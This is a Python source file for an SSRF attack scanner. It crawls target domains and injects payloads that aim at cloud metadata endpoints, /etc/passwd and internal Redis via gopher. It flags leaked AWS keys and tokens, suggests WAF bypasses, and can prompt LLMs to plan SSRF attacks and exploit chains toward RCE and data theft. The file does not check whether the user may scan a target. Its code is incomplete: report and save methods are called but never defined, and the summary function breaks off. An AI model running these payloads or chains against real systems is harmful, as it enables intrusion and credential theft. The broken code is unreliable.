#!/usr/bin/env python3
"""
Ultimate SSRF Arsenal v4.0 - AI-Powered Edition (Optional AI)
Complete SSRF Testing Framework with Optional Multi-LLM Integration
Supports: Claude, GPT-4o, Ollama, Gemini, Mistral, DeepSeek

AI features are completely optional - all core SSRF testing works without any LLM.
Uses argparse for proper command-line argument parsing.
"""

import asyncio
import json
import random
import re
import urllib.parse
import os
import sys
import socket
import argparse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Set, Any, Union
from collections import defaultdict, Counter
from pathlib import Path
from enum import Enum

# Core dependency
from playwright.async_api import async_playwright, Response, Page

# Optional dependencies - gracefully handled
try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

try:
    from jinja2 import Template
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False

try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
PURPLE = "\033[35m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"
OK = f"{GREEN}[OK]{RESET}"
WARN = f"{YELLOW}[!]{RESET}"
FAIL = f"{RED}[X]{RESET}"
AI_ICON = f"{PURPLE}[AI]{RESET}"

BANNER = f"""
{BOLD}{CYAN}
╔════════════════════════════════════════════════════════════════╗
║                ULTIMATE SSRF ARSENAL v4.0                     ║
║     AI-Powered SSRF Testing Framework (AI Optional)           ║
║     LLM Integration • Smart Payloads • Auto-Triage            ║
║            Created by belladonnask                            ║
╚════════════════════════════════════════════════════════════════╝
{RESET}"""


# ==================== DATA CLASSES ====================
@dataclass
class SSRFEvidence:
    phase: str
    technique: str
    url: str
    endpoint: str
    param: str
    payload: str
    status: int
    body_snippet: str
    matched_patterns: List[str]
    severity: str = "info"
    request_headers: Optional[Dict] = None
    response_headers: Optional[Dict] = None
    out_of_band_hit: bool = False
    ai_analysis: Optional[Dict] = None

@dataclass
class InterceptedRequest:
    url: str
    method: str
    headers: Dict
    body: str
    timestamp: datetime

@dataclass
class DiscoveredEndpoint:
    path: str
    method: str
    params: Set[str]
    accepts_url_param: bool
    test_response_code: int
    content_type: str


# ==================== ARGPARSE SETUP ====================
def setup_argparse() -> argparse.ArgumentParser:
    """Configure argument parser with all options"""
    parser = argparse.ArgumentParser(
        description="Ultimate SSRF Arsenal v4.0 - AI-Powered SSRF Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target
  python ssrf_arsenal.py --target example.com

  # Multiple targets
  python ssrf_arsenal.py --targets example.com,test.com,api.org

  # From file
  python ssrf_arsenal.py --target-file targets.txt

  # With callback and AI
  python ssrf_arsenal.py --target example.com --callback burp.oastify.com --ai-provider ollama

  # With Claude AI
  python ssrf_arsenal.py --target example.com --ai-provider claude --ai-key YOUR_KEY

  # Quiet mode
  python ssrf_arsenal.py --targets "example.com,test.com" --quiet
        """
    )
    
    # Target group (mutually exclusive)
    target_group = parser.add_mutually_exclusive_group()
    target_group.add_argument(
        "--target", "-t",
        type=str,
        help="Single target domain to scan"
    )
    target_group.add_argument(
        "--targets",
        type=str,
        help="Multiple targets (comma-separated)"
    )
    target_group.add_argument(
        "--target-file", "-f",
        type=str,
        help="File with targets (one per line, # for comments)"
    )
    
    # Callback options
    parser.add_argument(
        "--callback", "-c",
        type=str,
        default=None,
        help="Callback host for blind SSRF detection (e.g., burp.oastify.com)"
    )
    
    # Rate limiting
    parser.add_argument(
        "--delay", "-d",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)"
    )
    
    # Display options
    parser.add_argument(
        "--quiet", "-q",
        action="store_true",
        default=False,
        help="Less verbose output"
    )
    parser.add_argument(
        "--visible",
        action="store_true",
        default=False,
        help="Show browser window (not headless)"
    )
    
    # AI options
    ai_group = parser.add_argument_group("AI Integration (Optional)")
    ai_group.add_argument(
        "--ai-provider",
        type=str,
        choices=["claude", "openai", "ollama", "gemini", "mistral", "deepseek", "none"],
        default=None,
        help="LLM provider for AI features"
    )
    ai_group.add_argument(
        "--ai-key",
        type=str,
        default=None,
        help="API key for cloud AI providers"
    )
    ai_group.add_argument(
        "--ai-model",
        type=str,
        default=None,
        help="Specific model name (uses default if not specified)"
    )
    
    # Feature flags
    feature_group = parser.add_argument_group("Feature Flags")
    feature_group.add_argument(
        "--no-graphql",
        action="store_true",
        default=False,
        help="Disable GraphQL SSRF testing"
    )
    feature_group.add_argument(
        "--no-smuggling",
        action="store_true",
        default=False,
        help="Disable HTTP/2 smuggling tests"
    )
    feature_group.add_argument(
        "--no-html",
        action="store_true",
        default=False,
        help="Disable HTML report generation"
    )
    feature_group.add_argument(
        "--no-waf",
        action="store_true",
        default=False,
        help="Disable WAF detection"
    )
    
    return parser


# ==================== TARGET MANAGER ====================
class TargetManager:
    """Manage targets from multiple input sources using argparse results"""
    
    @staticmethod
    def from_single(domain: str) -> List[str]:
        """Single target"""
        domain = domain.strip()
        if not domain:
            return []
        domain = re.sub(r'^https?://', '', domain)
        domain = domain.split('/')[0]
        return [domain]
    
    @staticmethod
    def from_comma_list(domains: str) -> List[str]:
        """Comma-separated list"""
        targets = []
        for d in domains.split(','):
            d = d.strip()
            if d:
                d = re.sub(r'^https?://', '', d)
                d = d.split('/')[0]
                targets.append(d)
        return targets
    
    @staticmethod
    def from_file(filepath: str) -> List[str]:
        """Load from file (one per line)"""
        targets = []
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    line = re.sub(r'^https?://', '', line)
                    line = line.split('/')[0]
                    targets.append(line)
        except FileNotFoundError:
            print(f"{FAIL} File not found: {filepath}")
            sys.exit(1)
        except Exception as e:
            print(f"{FAIL} Error reading file: {e}")
            sys.exit(1)
        return targets
    
    @staticmethod
    def from_args(args: argparse.Namespace) -> List[str]:
        """Parse targets from argparse namespace"""
        targets = []
        
        if args.target:
            targets = TargetManager.from_single(args.target)
        elif args.targets:
            targets = TargetManager.from_comma_list(args.targets)
        elif args.target_file:
            targets = TargetManager.from_file(args.target_file)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_targets = []
        for t in targets:
            if t not in seen:
                seen.add(t)
                unique_targets.append(t)
        
        return unique_targets
    
    @staticmethod
    def interactive_select() -> List[str]:
        """Interactive target selection (fallback when no CLI args)"""
        print(f"\n{BOLD}{CYAN}TARGET SELECTION{RESET}")
        print(f"{DIM}{'─' * 40}{RESET}")
        print(f"  {BOLD}1{RESET} - Single domain")
        print(f"  {BOLD}2{RESET} - Multiple domains (comma-separated)")
        print(f"  {BOLD}3{RESET} - Load from file (one per line)")
        print(f"{DIM}{'─' * 40}{RESET}")
        
        while True:
            choice = input(f"{WARN} Select option [1/2/3]: ").strip()
            
            if choice == "1":
                domain = input(f"{WARN} Enter domain: ").strip()
                targets = TargetManager.from_single(domain)
                break
                
            elif choice == "2":
                print(f"{DIM}Example: example.com,test.com,api.site.org{RESET}")
                domains = input(f"{WARN} Enter domains (comma-separated): ").strip()
                targets = TargetManager.from_comma_list(domains)
                break
                
            elif choice == "3":
                print(f"{DIM}Example: /home/user/targets.txt{RESET}")
                filepath = input(f"{WARN} File path: ").strip()
                targets = TargetManager.from_file(filepath)
                break
                
            else:
                print(f"{FAIL} Invalid option. Please choose 1, 2, or 3.")
        
        return targets


# ==================== LLM PROVIDER SYSTEM (OPTIONAL) ====================
class LLMProvider(Enum):
    CLAUDE = "claude"
    OPENAI = "openai"
    OLLAMA = "ollama"
    GEMINI = "gemini"
    MISTRAL = "mistral"
    DEEPSEEK = "deepseek"
    CUSTOM = "custom"

class LLMClient:
    """Multi-provider LLM Client - completely optional"""
    
    DEFAULT_MODELS = {
        LLMProvider.CLAUDE: "claude-3-5-sonnet-20241022",
        LLMProvider.OPENAI: "gpt-4o",
        LLMProvider.OLLAMA: "llama3.1:latest",
        LLMProvider.GEMINI: "gemini-2.0-flash-exp",
        LLMProvider.MISTRAL: "mistral-large-latest",
        LLMProvider.DEEPSEEK: "deepseek-chat",
    }
    
    def __init__(self, provider: str = None, api_key: str = None, 
                 model: str = None, base_url: str = None):
        self.enabled = False
        self.provider = None
        self.api_key = api_key
        self.model = model
        self.base_url = base_url
        
        if provider and provider.lower() != "none":
            try:
                self.provider = LLMProvider(provider.lower())
                self.model = model or self.DEFAULT_MODELS.get(self.provider)
                self.enabled = self._check_prerequisites()
            except ValueError:
                print(f"{WARN} Unknown provider: {provider}")
    
    def _check_prerequisites(self) -> bool:
        """Check if everything needed is available"""
        if not AIOHTTP_AVAILABLE:
            print(f"{WARN} aiohttp not installed. AI disabled. Run: pip install aiohttp")
            return False
        
        if self.provider == LLMProvider.OLLAMA:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex(('localhost', 11434))
                sock.close()
                if result != 0:
                    print(f"{WARN} Ollama not running on localhost:11434")
                    return False
            except:
                return False
            return True
        
        if not self.api_key:
            print(f"{WARN} No API key for {self.provider.value}. AI disabled.")
            return False
        
        return True
    
    async def generate(self, system_prompt: str, user_message: str) -> Optional[str]:
        """Generate response - returns None if disabled"""
        if not self.enabled:
            return None
        
        try:
            if self.provider == LLMProvider.CLAUDE:
                return await self._call_claude(system_prompt, user_message)
            elif self.provider == LLMProvider.GEMINI:
                return await self._call_gemini(system_prompt, user_message)
            elif self.provider == LLMProvider.OLLAMA:
                return await self._call_ollama(system_prompt, user_message)
            else:
                return await self._call_openai_compatible(system_prompt, user_message)
        except Exception as e:
            return None
    
    async def _call_claude(self, system_prompt: str, user_message: str) -> str:
        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        }
        data = {
            "model": self.model,
            "max_tokens": 4096,
            "system": system_prompt,
            "messages": [{"role": "user", "content": user_message}]
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://api.anthropic.com/v1/messages",
                headers=headers, json=data, timeout=60
            ) as resp:
                result = await resp.json()
                return result.get("content", [{}])[0].get("text", "")
    
    async def _call_openai_compatible(self, system_prompt: str, user_message: str) -> str:
        urls = {
            LLMProvider.OPENAI: "https://api.openai.com/v1/chat/completions",
            LLMProvider.MISTRAL: "https://api.mistral.ai/v1/chat/completions",
            LLMProvider.DEEPSEEK: "https://api.deepseek.com/v1/chat/completions",
        }
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_message}
            ],
            "max_tokens": 4096
        }
        url = self.base_url or urls.get(self.provider, urls[LLMProvider.OPENAI])
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=data, timeout=60) as resp:
                result = await resp.json()
                return result.get("choices", [{}])[0].get("message", {}).get("content", "")
    
    async def _call_gemini(self, system_prompt: str, user_message: str) -> str:
        url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
        data = {
            "contents": [{"parts": [{"text": f"{system_prompt}\n\n{user_message}"}]}]
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, timeout=60) as resp:
                result = await resp.json()
                return result.get("candidates", [{}])[0].get("content", {}).get("parts", [{}])[0].get("text", "")
    
    async def _call_ollama(self, system_prompt: str, user_message: str) -> str:
        url = self.base_url or "http://localhost:11434/api/generate"
        data = {
            "model": self.model,
            "prompt": f"System: {system_prompt}\n\nUser: {user_message}\n\nAssistant:",
            "stream": False
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, timeout=120) as resp:
                result = await resp.json()
                return result.get("response", "")


# ==================== AI SKILLS (OPTIONAL) ====================
class AISkills:
    """AI-powered features - all gracefully degrade when LLM is unavailable"""
    
    def __init__(self, llm: Optional[LLMClient] = None):
        self.llm = llm
        self.enabled = llm and llm.enabled
    
    async def generate_payloads(self, context: Dict) -> List[str]:
        """Generate creative SSRF payloads for specific context"""
        if not self.enabled:
            return self._default_payloads(context)
        
        prompt = f"""Generate 10 creative SSRF payloads for:
Target: {context.get('target')}
WAF: {context.get('waf', 'None')}
Cloud: {context.get('cloud', 'Unknown')}
Endpoints: {json.dumps(context.get('endpoints', []))}
Return ONLY a JSON array of strings. No markdown, no explanation."""
        
        response = await self.llm.generate(
            "You are an expert penetration tester. Generate SSRF payloads.",
            prompt
        )
        
        if response:
            try:
                match = re.search(r'\[.*\]', response, re.DOTALL)
                if match:
                    return json.loads(match.group())
            except:
                pass
        
        return self._default_payloads(context)
    
    def _default_payloads(self, context: Dict) -> List[str]:
        return [
            f"http://127.0.0.1/",
            f"http://localhost/",
            f"http://169.254.169.254/latest/meta-data/",
            f"http://metadata.google.internal/",
            f"file:///etc/passwd",
            f"gopher://127.0.0.1:6379/_INFO",
            f"http://0x7f000001/",
            f"http://2130706433/",
            f"http://[::1]/",
            f"http://127.0.0.1.nip.io/",
        ]
    
    async def triage_findings(self, findings: List[Dict]) -> Dict:
        if not self.enabled:
            return {"analysis": "AI disabled", "findings": findings}
        
        prompt = f"""Analyze these SSRF findings and provide severity, exploitability (1-10), impact, and next steps.
Return ONLY JSON:
{{"findings": [{{"severity": "critical", "score": 9, "impact": "...", "steps": ["..."]}}], "overall_risk": "high"}}

Findings: {json.dumps(findings[:3], indent=2)}"""
        
        response = await self.llm.generate(
            "You are a security expert. Analyze findings concisely.",
            prompt
        )
        
        if response:
            try:
                match = re.search(r'\{.*\}', response, re.DOTALL)
                if match:
                    return json.loads(match.group())
            except:
                pass
        
        return {"analysis": "Could not parse AI response", "raw": str(response)[:500]}
    
    async def suggest_exploit_chain(self, vuln: Dict) -> List[Dict]:
        if not self.enabled:
            return [{"chain": "Manual analysis required", "steps": ["Verify SSRF", "Test metadata", "Check internal services"]}]
        
        prompt = f"""Given this SSRF vulnerability, suggest 3 exploit chains (SSRF → RCE, data exfil, etc.).
Return JSON array: [{{"name": "...", "steps": ["..."], "impact": "critical", "difficulty": "medium"}}]

Vulnerability: {json.dumps(vuln, indent=2)}"""
        
        response = await self.llm.generate(
            "You are an exploit chain expert. Be creative but realistic.",
            prompt
        )
        
        if response:
            try:
                match = re.search(r'\[.*\]', response, re.DOTALL)
                if match:
                    return json.loads(match.group())
            except:
                pass
        
        return [{"chain": "AI unavailable", "steps": ["Manual analysis required"]}]
    
    async def plan_attack(self, target_info: Dict) -> Dict:
        if not self.enabled:
            return {
                "strategy": "Standard SSRF testing",
                "phases": ["Discovery", "Validation", "Exploitation"],
                "priority_targets": ["Metadata endpoints", "Internal services", "Cloud APIs"]
            }
        
        prompt = f"""Plan an SSRF attack strategy for this target. Consider WAF bypass, cloud metadata, internal services.
Return JSON with phases, priorities, and techniques.

Target: {json.dumps(target_info, indent=2)}"""
        
        response = await self.llm.generate(
            "You are a senior penetration tester planning an engagement.",
            prompt
        )
        
        if response:
            try:
                match = re.search(r'\{.*\}', response, re.DOTALL)
                if match:
                    return json.loads(match.group())
            except:
                pass
        
        return {"strategy": "Standard approach", "note": "AI analysis unavailable"}


# ==================== WAF FINGERPRINTER ====================
class WAFFingerprinter:
    """Detect WAF/CDN from response signatures"""
    
    SIGNATURES = {
        "Cloudflare": {
            "headers": ["cf-ray", "cf-cache-status"],
            "cookies": ["__cfduid", "cf_clearance"],
            "body": ["cloudflare", "attention required"]
        },
        "AWS WAF": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "cookies": ["aws-waf-token"],
            "body": ["request blocked", "awselb"]
        },
        "Akamai": {
            "headers": ["x-akamai-transformed"],
            "cookies": ["ak_bmsc"],
            "body": ["akamai", "reference #"]
        },
        "Imperva": {
            "headers": ["x-cdn", "x-iinfo"],
            "cookies": ["incap_ses_", "visid_incap_"],
            "body": ["incapsula", "imperva"]
        },
        "F5 BIG-IP": {
            "headers": ["x-wa-info"],
            "cookies": ["f5avr", "tso"],
            "body": ["f5 networks", "big-ip"]
        },
        "ModSecurity": {
            "headers": [],
            "cookies": [],
            "body": ["mod_security", "modsecurity"]
        },
        "Sucuri": {
            "headers": ["x-sucuri-id"],
            "cookies": ["sucuri_cloudproxy_uuid"],
            "body": ["sucuri", "cloudproxy"]
        },
        "Wordfence": {
            "headers": [],
            "cookies": ["wfvt_"],
            "body": ["wordfence", "generated by wordfence"]
        },
        "Fastly": {
            "headers": ["fastly-debug-digest", "x-served-by"],
            "cookies": [],
            "body": ["fastly"]
        },
        "Varnish": {
            "headers": ["x-varnish", "via"],
            "cookies": [],
            "body": ["varnish"]
        },
        "Google Cloud Armor": {
            "headers": [],
            "cookies": [],
            "body": ["google cloud armor"]
        },
        "Azure WAF": {
            "headers": ["x-ms-request-id", "x-azure-ref"],
            "cookies": [],
            "body": ["azure web application firewall"]
        }
    }
    
    BYPASS_SUGGESTIONS = {
        "Cloudflare": [
            "DNS rebinding (nip.io/sslip.io)",
            "IPv6 notation: http://[::ffff:127.0.0.1]/",
            "Decimal IP: http://2130706433/"
        ],
        "AWS WAF": [
            "IMDSv1 downgrade",
            "Alternative metadata IPs"
        ],
        "Imperva": [
            "Double URL encoding",
            "Unicode normalization",
            "gopher:// protocol"
        ],
        "ModSecurity": [
            "CRLF injection",
            "Hex encoding: %68%74%74%70://"
        ]
    }
    
    def fingerprint(self, headers: Dict, body: str, cookies: Dict = None) -> Dict:
        """Detect WAF and return info"""
        cookies = cookies or {}
        headers_lower = {k.lower(): str(v).lower() for k, v in headers.items()}
        body_lower = body.lower()[:10000]
        cookie_keys = [k.lower() for k in cookies.keys()]
        
        results = {}
        
        for waf, sigs in self.SIGNATURES.items():
            score = 0
            max_score = 0
            
            for h in sigs["headers"]:
                max_score += 2
                if any(h.lower() in hk for hk in headers_lower):
                    score += 2
            
            for c in sigs["cookies"]:
                max_score += 2
                if any(c.lower() in ck for ck in cookie_keys):
                    score += 2
            
            for b in sigs["body"]:
                max_score += 1
                if b in body_lower:
                    score += 1
            
            if max_score > 0:
                confidence = (score / max_score) * 100
                if confidence >= 20:
                    results[waf] = confidence
        
        sorted_results = sorted(results.items(), key=lambda x: x[1], reverse=True)
        
        if sorted_results:
            return {
                "detected": True,
                "primary": sorted_results[0][0],
                "confidence": sorted_results[0][1],
                "all_matches": dict(sorted_results[:3]),
                "bypass_suggestions": self.BYPASS_SUGGESTIONS.get(sorted_results[0][0], [])
            }
        
        return {"detected": False, "primary": None, "confidence": 0, "all_matches": {}, "bypass_suggestions": []}


# ==================== MAIN ARSENAL CLASS ====================
class UltimateSSRFArsenal:
    """Complete SSRF Testing Framework"""
    
    def __init__(self, target: str, callback: str = None, delay: float = 0.5,
                 verbose: bool = True, headless: bool = True,
                 ai_provider: str = None, ai_key: str = None, ai_model: str = None,
                 enable_waf: bool = True):
        
        self.target = target
        self.base_url = f"https://{target}" if not target.startswith("http") else target
        self.callback_host = callback or f"{target}.ssrf-test.local"
        self.delay = delay
        self.verbose = verbose
        self.headless = headless
        self.enable_waf = enable_waf
        
        # Results
        self.evidence = []
        self.endpoints = []
        self.vulnerable = []
        self.params = set()
        self.callbacks = defaultdict(list)
        self.intercepted = []
        self.waf_info = {}
        
        # Components
        self.waf_detector = WAFFingerprinter()
        
        # AI (optional)
        self.llm = None
        self.ai = None
        if ai_provider and ai_provider.lower() != "none":
            self.llm = LLMClient(ai_provider, api_key=ai_key, model=ai_model)
            if self.llm.enabled:
                self.ai = AISkills(self.llm)
                if self.verbose:
                    print(f"{AI_ICON} {GREEN}AI enabled: {ai_provider} ({self.llm.model}){RESET}")
            else:
                if self.verbose:
                    print(f"{WARN} AI disabled - provider not available")
        
        # Playwright
        self.playwright = None
        self.browser = None
        self.page = None
        
        # Files
        safe_target = re.sub(r'[^a-zA-Z0-9.-]', '_', target)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.results_file = f"ssrf_{safe_target}_{timestamp}.json"
        self.report_file = f"ssrf_report_{safe_target}_{timestamp}.html"
        
        # Concurrency
        self.sem = asyncio.Semaphore(10)
    
    async def start(self):
        """Initialize browser"""
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=self.headless)
        ctx = await self.browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        await ctx.route("**/*", self._intercept)
        self.page = await ctx.new_page()
    
    async def stop(self):
        """Cleanup"""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
    
    async def _intercept(self, route):
        """Intercept requests"""
        req = route.request
        url = req.url
        
        if self.callback_host and self.callback_host in url:
            if self.verbose:
                print(f"\n{RED}{BOLD}[!!! BLIND SSRF !!!]{RESET} {url[:120]}")
            
            ev = SSRFEvidence(
                phase="BLIND_SSRF", technique="OOB Callback",
                url=url, endpoint="", param="", payload=url,
                status=200, body_snippet="",
                matched_patterns=["[CRITICAL] Blind SSRF confirmed"],
                severity="critical", out_of_band_hit=True
            )
            self.evidence.append(ev)
            self.callbacks[url].append({
                "time": datetime.now().isoformat(),
                "method": req.method,
                "headers": dict(req.headers)
            })
        
        await route.continue_()
    
    async def request(self, method: str, url: str, data=None, headers=None, timeout=15000):
        """Make HTTP request"""
        async with self.sem:
            try:
                if method == "GET":
                    resp = await self.page.goto(url, wait_until="domcontentloaded", timeout=timeout)
                    status = resp.status if resp else 0
                    body = await resp.text() if resp else ""
                    hdrs = dict(resp.headers) if resp else {}
                else:
                    js = f"""
                    (async () => {{
                        const r = await fetch('{url}', {{
                            method: '{method}',
                            headers: {json.dumps(headers or {})},
                            body: {json.dumps(json.dumps(data) if data else "")}
                        }});
                        return {{ status: r.status, body: await r.text(), headers: Object.fromEntries(r.headers) }};
                    }})();
                    """
                    result = await self.page.evaluate(js)
                    status = result.get("status", 0)
                    body = result.get("body", "")
                    hdrs = result.get("headers", {})
                
                await asyncio.sleep(self.delay)
                return status, body, hdrs
            except:
                return 0, "", {}
    
    async def check_evidence(self, phase, technique, url, endpoint, param, payload, status, body, headers):
        """Check for SSRF evidence"""
        patterns = [
            (r'root:[^:]+:[0-9]+:[0-9]+:', '/etc/passwd leaked', 'critical'),
            (r'"access_token"\s*:\s*"[^"]{20,}"', 'Access token leaked', 'critical'),
            (r'AKIA[0-9A-Z]{16}', 'AWS key leaked', 'critical'),
            (r'computeMetadata|metadata\.google\.internal', 'GCP metadata', 'high'),
            (r'169\.254\.\d{1,3}\.\d{1,3}', 'Cloud metadata IP', 'high'),
            (r'10\.\d{1,3}\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
            (r'192\.168\.\d{1,3}\.\d{1,3}', 'Internal IP', 'high'),
            (r'SQLSTATE|mysql_error', 'SQL error', 'medium'),
            (r'Warning:\s+file_get_contents', 'PHP SSRF warning', 'high'),
        ]
        
        matched = []
        combined = (body + json.dumps(headers)).lower()
        
        for pat, desc, sev in patterns:
            if re.search(pat, combined, re.I | re.M):
                matched.append(f"[{sev.upper()}] {desc}")
        
        if self.callback_host and self.callback_host in body:
            matched.append("[CRITICAL] Callback in response")
        
        if matched:
            sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
            sev = min(sev_order.get(p.split("]")[0].replace("[", ""), 3) for p in matched)
            sev_map = {0: "critical", 1: "high", 2: "medium", 3: "low"}
            
            ev = SSRFEvidence(
                phase=phase, technique=technique,
                url=url, endpoint=endpoint, param=param,
                payload=payload, status=status,
                body_snippet=body[:300], matched_patterns=matched,
                severity=sev_map.get(sev, "info"),
                response_headers=headers
            )
            self.evidence.append(ev)
            return [ev]
        return []
    
    async def test_payload(self, endpoint, param, payload, phase, technique):
        """Test a single payload"""
        if endpoint.method == "GET":
            sep = "&" if "?" in endpoint.path else "?"
            url = f"{self.base_url}{endpoint.path}{sep}{param}={urllib.parse.quote(payload)}"
            status, body, headers = await self.request("GET", url)
        else:
            url = f"{self.base_url}{endpoint.path}"
            status, body, headers = await self.request("POST", url, {param: payload})
        
        findings = await self.check_evidence(
            phase, technique, url, endpoint.path, param, payload, status, body, headers
        )
        
        if findings and self.verbose:
            for f in findings:
                col = {"critical": RED, "high": YELLOW, "medium": MAGENTA}.get(f.severity, BLUE)
                print(f"  {col}[{f.severity.upper()}]{RESET} {endpoint.path} → {param}")
                if f.matched_patterns:
                    print(f"    {DIM}{f.matched_patterns[0][:100]}{RESET}")
        
        return bool(findings)
    
    async def discover(self):
        """Phase 0: Discover endpoints"""
        if self.verbose:
            print(f"\n{CYAN}[DISCOVERY]{RESET} Crawling endpoints...")
        
        paths = [
            "/", "/api", "/v1", "/v2", "/api/v1",
            "/proxy", "/fetch", "/download", "/upload",
            "/webhook", "/callback", "/redirect", "/go",
            "/graphql", "/gql", "/health", "/status"
        ]
        
        for path in paths:
            try:
                url = f"{self.base_url}{path}"
                status, body, headers = await self.request("GET", url, timeout=8000)
                
                if status not in (0, 404, 403):
                    params = set()
                    params.update(re.findall(r'[?&]([a-zA-Z_]\w*)=', url))
                    params.update(re.findall(r'name=["\']([^"\']+)["\']', body, re.I))
                    
                    ep = DiscoveredEndpoint(
                        path=path, method="GET", params=params,
                        accepts_url_param=True,
                        test_response_code=status,
                        content_type=headers.get("content-type", "")
                    )
                    self.endpoints.append(ep)
                    
                    if self.verbose and status != 200:
                        print(f"  {DIM}[{status}]{RESET} {path}")
            except:
                pass
        
        if self.verbose:
            print(f"  {OK} Found {len(self.endpoints)} endpoints")
        
        return self.endpoints
    
    async def detect_waf(self):
        """Detect WAF"""
        if not self.enable_waf:
            return
        
        if self.verbose:
            print(f"\n{CYAN}[WAF]{RESET} Detecting firewall...")
        
        status, body, headers = await self.request("GET", self.base_url)
        self.waf_info = self.waf_detector.fingerprint(headers, body)
        
        if self.waf_info.get("detected"):
            print(f"  {YELLOW}Detected:{RESET} {self.waf_info['primary']} ({self.waf_info['confidence']:.0f}%)")
            if self.verbose and self.waf_info.get("bypass_suggestions"):
                print(f"  {DIM}Bypass tips:{RESET}")
                for tip in self.waf_info["bypass_suggestions"][:3]:
                    print(f"    • {tip}")
        else:
            print(f"  {OK} No WAF detected")
    
    async def run_ai_phases(self):
        """Run AI-powered phases if available"""
        if not self.ai or not self.ai.enabled:
            return
        
        if self.verbose:
            print(f"\n{PURPLE}{BOLD}[AI PHASES]{RESET} Running AI-powered analysis...")
        
        context = {
            "target": self.target,
            "waf": self.waf_info.get("primary", "None"),
            "endpoints": [e.path for e in self.endpoints[:5]],
            "params": list(self.params)[:10]
        }
        
        ai_payloads = await self.ai.generate_payloads(context)
        if self.verbose:
            print(f"  {AI_ICON} Generated {len(ai_payloads)} custom payloads")
        
        if self.endpoints and ai_payloads:
            ep = self.endpoints[0]
            param = list(ep.params)[0] if ep.params else "url"
            for payload in ai_payloads[:5]:
                await self.test_payload(ep, param, payload, "AI-Generated", "AI Payload")
        
        if self.evidence:
            triage = await self.ai.triage_findings([
                {"endpoint": e.endpoint, "param": e.param, "severity": e.severity, "patterns": e.matched_patterns[:2]}
                for e in self.evidence[:5]
            ])
            if self.verbose and "error" not in triage:
                risk = triage.get("overall_risk", "unknown")
                print(f"  {AI_ICON} AI Risk Assessment: {YELLOW}{risk.upper()}{RESET}")
        
        if self.evidence:
            chains = await self.ai.suggest_exploit_chain({
                "endpoint": self.evidence[0].endpoint,
                "param": self.evidence[0].param,
                "severity": self.evidence[0].severity,
                "waf": self.waf_info.get("primary")
            })
            if self.verbose and chains:
                print(f"  {AI_ICON} Suggested exploit chains: {len(chains)}")
                for chain in chains[:2]:
                    print(f"    • {chain.get('name', chain.get('chain', 'Unknown'))}")
    
    async def run_basic_phases(self):
        """Run basic SSRF test phases"""
        if self.verbose:
            print(f"\n{CYAN}[BASIC PHASES]{RESET} Running standard SSRF tests...")
        
        test_params = ["url", "uri", "file", "path", "redirect", "proxy", "fetch", "download", "callback"]
        
        for ep in self.endpoints[:5]:
            for param in test_params:
                payload = f"http://{self.callback_host}/test-{random.randint(1000,9999)}"
                await self.test_payload(ep, param, payload, "Basic", f"Testing {param}")
    
    async def run_full_scan(self):
        """Run complete scan"""
        print(f"\n{BOLD}{'='*50}{RESET}")
        print(f"{BOLD}Target:{RESET} {self.target}")
        print(f"{BOLD}Callback:{RESET} {self.callback_host}")
        print(f"{BOLD}AI:{RESET} {'Enabled' if self.ai and self.ai.enabled else 'Disabled'}")
        print(f"{BOLD}WAF:{RESET} {'Enabled' if self.enable_waf else 'Disabled'}")
        print(f"{BOLD}{'='*50}{RESET}")
        
        await self.start()
        
        try:
            await self.detect_waf()
            await self.discover()
            await self.run_basic_phases()
            await self.run_ai_phases()
            await self.save_results()
            await self.generate_report()
            self.print_summary()
        finally:
            await self.stop()
    
    def deduplicate(self) -> Dict:
        """Deduplicate findings"""
        groups = defaultdict(lambda: {"findings": [], "max_sev": "info", "oob": 0, "sensitive": False})
        sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        
        for f in self.evidence:
            key = (f.endpoint, f.param)
            groups[key]["findings"].append(f)
            if sev_order.get(f.severity, 4) < sev_order.get(groups[key]["max_sev"], 4):
                groups[key]["max_sev"] = f.severity
            if f.out_of_band_hit:
                groups[key]["oob"] += 1
            if any(kw in str(f.matched_patterns).lower() for kw in ["token", "key", "credential"]):
                groups[key]["sensitive"] = True
        
        return dict(groups)
    
    def print_summary(self):
        """Print scan summary"""
        deduped = self.deduplicate()
        
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
